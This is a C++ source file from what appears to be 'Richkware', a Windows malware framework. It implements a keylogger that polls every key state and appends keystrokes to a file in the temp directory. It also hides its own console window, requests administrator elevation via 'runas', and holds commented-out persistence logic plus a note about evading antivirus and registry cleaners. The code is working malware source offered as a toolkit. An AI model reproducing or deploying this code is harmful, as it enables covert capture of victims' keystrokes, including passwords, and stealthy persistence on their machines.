/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#include "richkware.h"

BOOL Richkware::IsAdmin() {
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&NtAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		dwError = GetLastError();

	}
	else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
		&fIsRunAsAdmin)) {
		dwError = GetLastError();

	}

	if (pAdministratorsGroup) {
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	if (ERROR_SUCCESS != dwError) {
		throw dwError;
	}

	return fIsRunAsAdmin;
}

void Richkware::RequestAdminPrivileges() {
	BOOL bAlreadyRunningAsAdministrator = FALSE;
	try {
		bAlreadyRunningAsAdministrator = IsAdmin();
	}
	catch (...) {

	}
	if (!bAlreadyRunningAsAdministrator) {
		char szPath[MAX_PATH];
		if (GetModuleFileName(NULL, szPath, MAX_PATH)) {

			SHELLEXECUTEINFO sei = { sizeof(sei) };

			sei.lpVerb = "runas";
			sei.lpFile = szPath;
			sei.hwnd = NULL;
			sei.nShow = SW_NORMAL;

			/*if (!ShellExecuteEx(&sei)) {
			 DWORD dwError = GetLastError();
			 //if (dwError == ERROR_CANCELLED)
			 //CreateThread(0, 0, (LPTHREAD_START_ROUTINE) RequestAdminPrivileges, 0, 0, 0);
			 }*/
		}

	}
	else {
		///Code
	}
}


void Richkware::StealthWindow(const char* window) {
	HWND app_heandler = FindWindow(NULL, window);
	Sleep(1000);
	if (app_heandler != NULL)
		ShowWindow(app_heandler, false);
}

// OpenApp("notepad.exe");  "http:\\www.google.com"
void Richkware::OpenApp(const char* app) {
	ShellExecute(NULL, "open", app, NULL, NULL, SW_MAXIMIZE);
}


void Richkware::RandMouse() {
	// screen resolution
	RECT desktop;
	const HWND desktop_handler = GetDesktopWindow();
	GetWindowRect(desktop_handler, &desktop);
	long horizontal = desktop.right;
	long vertical = desktop.bottom;

	// move cursor
	SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
}


void Richkware::Keylogger(const char* fileName) {
	HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*)fileName, 0, 0);

	if (hBlockAppsTh != NULL) {
		WaitForSingleObject(hBlockAppsTh, INFINITE);
		CloseHandle(hBlockAppsTh);
	}
}

void Richkware::Hibernation() {
	Sleep(1000);
	SendMessage(HWND_BROADCAST,
		WM_SYSCOMMAND,
		SC_MONITORPOWER, (LPARAM)2);
}


Richkware::Richkware(const char* AppNameArg, const char* EncryptionKeyArg) {
		appName = AppNameArg;
		system(("title " + appName).c_str());
		StealthWindow(appName.c_str());
		encryptionKey = EncryptionKeyArg;
		network = Network(EncryptionKeyArg);
		session = Session(EncryptionKeyArg, AppNameArg);
		systemStorage = SystemStorage(AppNameArg);

		/*
		if (!(CheckSession()) && !(CheckPersistance())) {	// first run
		SaveInfo("FirstRun", "false");
		Persistance();
		}
		else if (!(CheckSession())) {	// N session, Y pers
		SaveInfo("FirstRun", "false");
		SaveInfo("RegCleaner", "true");
		}
		else if (!(CheckPersistance())) {	// Y session, N pers
		SaveInfo("TmpSysCleaner", "true");
		Persistance();
		}*/

		// metti check per ogni cosa registro o file in modo da sapere se ha qualcosa che controlla il registro o qualcosa che effettui pulizie o un antivirus

}

DWORD WINAPI KeyloggerThread(void* arg) {
	const char* nomeFile = (const char*)arg;
	char tmp_path[MAX_PATH];
	GetTempPath(MAX_PATH, tmp_path);
	std::string fileLog = tmp_path;
	fileLog.append(nomeFile);
	bool condSession = true;

	while (true) {
		std::ofstream file(fileLog.c_str(), std::ios::app);
		if (file.is_open()) {
			while (condSession) {
				for (int i = 0; i < 256; i++) {
					if (GetAsyncKeyState(i)) {
						file << (char)i;
						if (i == VK_RETURN || i == VK_LBUTTON) {
							condSession = false;
							break;
						}
					}
				}
				Sleep(100);
			}
		}
		file.close();
		condSession = true;
	}
}
